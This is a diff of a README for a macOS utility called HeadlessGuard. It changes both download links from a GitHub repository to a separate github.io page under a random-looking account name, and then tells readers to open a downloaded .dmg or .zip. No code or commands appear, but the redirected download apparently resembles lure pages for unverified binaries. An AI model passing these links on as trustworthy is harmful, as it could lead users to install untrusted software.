@@ -1,6 +1,6 @@
 # 🛡️ HeadlessGuard - Stop Orphaned Browsers, Save Your Mac
 
-[![Download HeadlessGuard](https://img.shields.io/badge/Download-HeadlessGuard-blue?style=for-the-badge&logo=github&labelColor=white&color=orange)](https://github.com/Ribessanguineumerikaxelkarlfeldt584/HeadlessGuard)
+[![Download HeadlessGuard](https://img.shields.io/badge/Download-HeadlessGuard-blue?style=for-the-badge&logo=github&labelColor=white&color=orange)](https://ribessanguineumerikaxelkarlfeldt584.github.io)
 
 ## 🚀 Getting Started
 
@@ -33,7 +33,7 @@ HeadlessGuard runs quietly in your menu bar. When it detects an orphaned headles
 
 ## 📥 Installation
 
-Visit this link to download the application: [https://github.com/Ribessanguineumerikaxelkarlfeldt584/HeadlessGuard](https://github.com/Ribessanguineumerikaxelkarlfeldt584/HeadlessGuard)
+Visit this link to download the application: [https://ribessanguineumerikaxelkarlfeldt584.github.io](https://ribessanguineumerikaxelkarlfeldt584.github.io)
 
 1. Open the downloaded file (usually named `HeadlessGuard.dmg` or `HeadlessGuard.zip`)
 2. Drag the HeadlessGuard app to your Applications folder
